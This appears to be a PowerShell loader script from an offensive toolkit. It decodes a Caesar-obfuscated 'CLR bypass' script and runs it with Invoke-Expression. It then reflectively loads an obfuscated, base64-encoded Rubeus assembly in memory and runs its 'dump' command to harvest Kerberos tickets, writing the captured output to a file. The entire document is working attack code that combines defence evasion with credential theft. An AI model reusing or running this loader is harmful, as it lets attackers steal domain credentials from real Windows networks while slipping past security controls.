# Using either script's directory or else cmd's current dir
if ($PSScriptRoot) {
    # If $PSScriptRoot is defined, use it
    $workingDir = $PSScriptRoot
    Write-Host "Using the script's directory: $workingDir"
}
else {
    $workingDir = (Get-Location).Path
    Write-Host "Using the current working directory: $workingDir"
}

# $RdestPathC and #CdestPathC are the filenames of encrypted Rubeus64 and CLR bypass and must be set accordingly

$CdestPathC = "$workingDir\clrbp.ps1.txt"
$RdestPathC   = "$workingDir\renc.txt"

Invoke-Expression (.\caesar.ps1 -Shift -3 -InputFile $CdestPathC)

$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((.\caesar.ps1 -Shift -3 -InputFile $RdestPathC).Trim()))
# 1. Save the current console output stream
$oldOut = [System.Console]::Out

try {
    # 2. Create a StringWriter to capture everything that Rubeus writes
    $stringWriter = New-Object System.IO.StringWriter
    
    # 3. Redirect the console to our StringWriter
    [System.Console]::SetOut($stringWriter)

    # 4. Invoke the Rubeus "dump" command in-memory
    [Rubeus.Program]::Main("dump".Split())

    # 5. Flush the writer (just to be safe)
    $stringWriter.Flush()

    # 6. Grab the captured text
    $dumpOutput = $stringWriter.ToString()

    # 7. Write the output to a file
    [IO.File]::WriteAllText("$workingDir\rubeus_dump.txt", $dumpOutput)

} finally {
    # 8. Restore the original console output
    [System.Console]::SetOut($oldOut)
}
